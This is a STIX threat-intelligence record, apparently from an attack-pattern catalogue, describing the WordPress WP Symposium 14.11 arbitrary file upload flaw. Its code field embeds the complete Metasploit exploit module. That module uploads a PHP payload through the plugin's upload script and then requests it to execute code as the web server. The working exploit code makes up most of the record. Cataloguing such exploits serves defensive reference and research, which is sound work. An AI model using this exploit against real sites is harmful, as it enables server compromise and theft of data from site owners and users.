{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f7763db2-3ced-467e-ab70-5538484a7284",
    "created": "2024-08-14T17:12:01.270034Z",
    "modified": "2024-08-14T17:12:01.270037Z",
    "name": "WordPress WP Symposium 14.11 Shell Upload",
    "description": " WP Symposium Plugin for WordPress contains a flaw that allows a remote attacker to execute arbitrary PHP code. This flaw exists because the /wp-symposium/server/file_upload_form.php script does not properly verify or sanitize user-uploaded files. By uploading a .php file, the remote system will place the file in a user-accessible path. Making a direct request to the uploaded file will allow the attacker to execute the script with the privileges of the web server.  'License'         => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/wp_symposium_shell_upload.rb",
            "external_id": "wp_symposium_shell_upload.rb"
        },
        {
            "source_name": "WPVDB",
            "external_id": "7716"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::Remote::HTTP::Wordpress\n\n  def initialize(info = {})\n    super(update_info(\n      info,\n      'Name'            => 'WordPress WP Symposium 14.11 Shell Upload',\n      'Description'     => %q{\n          WP Symposium Plugin for WordPress contains a flaw that allows a remote attacker\n          to execute arbitrary PHP code. This flaw exists because the\n          /wp-symposium/server/file_upload_form.php script does not properly verify or\n          sanitize user-uploaded files. By uploading a .php file, the remote system will\n          place the file in a user-accessible path. Making a direct request to the\n          uploaded file will allow the attacker to execute the script with the privileges\n          of the web server.\n        },\n      'License'         => MSF_LICENSE,\n      'Author'          =>\n        [\n          'Claudio Viviani', # Vulnerability disclosure\n          'rastating'        # Metasploit module\n        ],\n      'References'      =>\n        [\n          ['OSVDB', '116046'],\n          ['WPVDB', '7716']\n        ],\n      'DisclosureDate'  => '2014-12-11',\n      'Platform'        => 'php',\n      'Arch'            => ARCH_PHP,\n      'Targets'         => [['wp-symposium < 14.12', {}]],\n      'DefaultTarget'   => 0\n    ))\n  end\n\n  def check\n    check_plugin_version_from_readme('wp-symposium', '14.12')\n  end\n\n  def generate_mime_message(payload, payload_name, directory_name, symposium_url)\n    data = Rex::MIME::Message.new\n    data.add_part('1', nil, nil, 'form-data; name=\"uploader_uid\"')\n    data.add_part(\"./#{directory_name}/\", nil, nil, 'form-data; name=\"uploader_dir\"')\n    data.add_part(symposium_url, nil, nil, 'form-data; name=\"uploader_url\"')\n    data.add_part(payload.encoded, 'application/x-php', nil, \"form-data; name=\\\"files[]\\\"; filename=\\\"#{payload_name}\\\"\")\n    data\n  end\n\n  def exploit\n    print_status(\"Preparing payload\")\n    unique_name = Rex::Text.rand_text_alpha(10)\n    payload_name = \"#{unique_name}.php\"\n    symposium_url = normalize_uri(wordpress_url_plugins, 'wp-symposium', 'server', 'php')\n    payload_url = normalize_uri(symposium_url, unique_name, payload_name)\n    data = generate_mime_message(payload, payload_name, unique_name, symposium_url)\n    symposium_url = normalize_uri(symposium_url, 'index.php')\n\n    print_status(\"Uploading payload to #{payload_url}\")\n    res = send_request_cgi(\n      'method'  => 'POST',\n      'uri'     => symposium_url,\n      'ctype'   => \"multipart/form-data; boundary=#{data.bound}\",\n      'data'    => data.to_s\n    )\n\n    if res && res.code == 200 && res.body.length > 0 && !res.body.include?('error') && res.body != '0'\n      print_good(\"Uploaded the payload\")\n      register_files_for_cleanup(payload_name)\n\n      print_status(\"Executing the payload...\")\n      send_request_cgi(\n      {\n        'uri'     => payload_url,\n        'method'  => 'GET'\n      }, 5)\n      print_good(\"Executed payload\")\n    else\n      if res.nil?\n        fail_with(Failure::Unreachable, \"No response from the target\")\n      else\n        vprint_error(\"HTTP Status: #{res.code}\")\n        vprint_error(\"Server returned: #{res.body}\")\n        fail_with(Failure::UnexpectedReply, \"Failed to upload the payload\")\n      end\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-12-11",
    "x_mitre_platforms": [
        "php'"
    ]
}